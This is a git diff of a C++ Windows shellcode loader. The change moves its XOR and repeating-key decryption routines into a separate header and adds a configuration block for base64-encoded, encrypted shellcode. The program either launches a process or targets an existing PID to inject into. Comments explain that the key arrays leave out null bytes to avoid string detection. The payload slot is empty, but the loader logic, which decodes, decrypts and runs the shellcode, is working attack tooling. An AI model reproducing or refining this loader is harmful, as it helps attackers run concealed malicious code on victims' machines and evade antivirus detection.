@@ -4,6 +4,7 @@
 #include <iostream>
 #include <Windows.h>
 #include "base64.h"
+#include "decryption.h"
 #include <string>
 #include "ghostcalls.h"
 
@@ -18,6 +19,10 @@ enum ExecutionMode {
 	EXEC = 1,
 	PID = 2
 };
+enum DECRYPTION_MODE {
+	XOR_KEY = 1,
+	BYTEWISE_XOR = 2
+};
 
 // GLOBALS
 bool DEBUG_MODE = false;
@@ -25,11 +30,24 @@ ExecutionMode E_MODE;
 int TARGET_PID;
 char* LAUNCH_COMMAND;
 
+///////////////////////////////////////////////////////////////////////////////////////
+// RUNNER CONFIG
+///////////////////////////////////////////////////////////////////////////////////////
 
-// THE DECRYPT METHOD, THIS IS SOMETHING THAT NEEDS TO BE WRITTEN DEPENDING ON HOW YOUR SC IS GENERATED/ENCRYPTED
-// DECRYPT IN PLACE OR CREATE ANEW ONE, BUT RETURN IT EITHER WAY
-unsigned char* decryptKey(unsigned char*, size_t);
-unsigned char* decryptXOR(unsigned char*, size_t);
+// TODO: PUT YOUR SC HERE
+const string ENCODED_SC = "";
+
+// TODO: IF USING BYTEWISE XOR, PUT KEY HERE IN DECIMAL OR HEX
+const unsigned char BYTEWISE_XOR_KEY = 77;
+
+// TODO: IF USING THE XOR KEY ENCRYPTION, CONFIG KEY AND LENGTH HERE.
+// NOTE: DO NOT INCLUDE NULL BYTE (PREVENT STRING DETECTION) IN EITHER THE ARRAY OR IN THE LENGTH
+unsigned char XOR_KEY_STR[] = { 'e', 'x', 'i', 'g', 'e', 'n', 't'};
+const size_t XOR_KEY_STR_LEN = 7;
+
+// TODO: SET DECRYPTION MODE TO EITHER ENCRYPTION_KEY OR BYTEWISE_XOR
+DECRYPTION_MODE DECR_MODE = XOR_KEY;
+
 
 // THE RUNNER METHOD, THIS IS PROVIDED
 void run(unsigned char*, size_t); 
@@ -59,7 +77,6 @@ int main(int argc, char** argv)
 	}
 
 	// IMPORTANT! BASE64 ENCODED SC GOES HERE
-	string encodedBytes = "";
 	char* argString = argv[2];
 	if (strcmp(argv[1], "PID") == 0) {
 		// EXECUTE BY CREATING A NEW PROCESS TO INJECT INTO
@@ -80,63 +97,25 @@ int main(int argc, char** argv)
 
 
 	// BASE64 DECODE THE STRING TO GET BYTES
-	string decodedBytes = base64_decode(encodedBytes);
+	string decodedBytes = base64_decode(ENCODED_SC);
 	unsigned char* encryptedBytes = (unsigned char*)decodedBytes.c_str();
 	size_t bufLen = decodedBytes.length();
 
-	// DECRYPT THE BYTES
-	unsigned char* decr = decryptKey(encryptedBytes, bufLen);
+	// DECRYPT THE BYTES DEPENDING ON DECRYPTION MODE
+	unsigned char* decr = nullptr;
+	if (DECR_MODE == XOR_KEY) {
+		decr = decryption::decryptKey(XOR_KEY_STR, XOR_KEY_STR_LEN, encryptedBytes, bufLen);
+	}
+	else if (DECR_MODE == BYTEWISE_XOR) {
+		decr = decryption::decryptXOR(BYTEWISE_XOR_KEY, encryptedBytes, bufLen);
+	}
+	
 
 	// RUN THE SC
 	run(decr, bufLen);
 
 	return 0;
 
-}
-
-
-unsigned char* decryptXOR(unsigned char* encryptedBytes, size_t length) {
-
-	if (DEBUG_MODE) cout << "Decrypting w/ bytewise XOR" << endl;
-	const unsigned char xKey = 35;
-
-	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
-
-	for (size_t i = 0; i < length; i++) {
-		decrData[i] = encryptedBytes[i] ^ xKey;
-	}
-	decrData[length] = '\x00';
-	if (DEBUG_MODE) cout << "finished decryption" << endl;
-	return decrData;
-}
-
-// EXAMPLE DECRYPTION METHOD WITH XOR KEY; THIS SHOULD BE FILLED IN WITH YOUR DECRYPTION METHOD
-unsigned char* decryptKey(unsigned char* encryptedBytes, size_t length) {
-
-	if (DEBUG_MODE) cout << "Decrypting with key..." << endl;
-
-	// NO NULL BYTE TO PREVENT STRING DETECTION
-	// KEY AND KEY LENGTH
-	char key[] = {'S', 't', 'o', 'r', 'm', 'F', 'a', 'l', 'l'};
-	size_t keyLength = 9;
-
-	unsigned char* decrData = new unsigned char[length + 1]; // ALLOCATE + 1 FOR NULL BYTE
-
-	// i IS THE INDEX IN THE SC
-	// j IS THE INDEX IN THE KEY
-	size_t j = 0;
-	for (size_t i = 0; i < length; i++) {
-
-		// IF WE'RE AT THE END OF THE KEY, GO BACK TO THE BEGINNING
-		if (j == keyLength) {
-			j = 0;
-		}
-		decrData[i] = encryptedBytes[i] ^ (unsigned char)key[j];
-		j++;
-	}
-	decrData[length] = '\x00';
-	if (DEBUG_MODE) cout << "Finished decrypting!" << endl;
-	return decrData;
 }
 
 void run(unsigned char* sc, size_t scLen) {
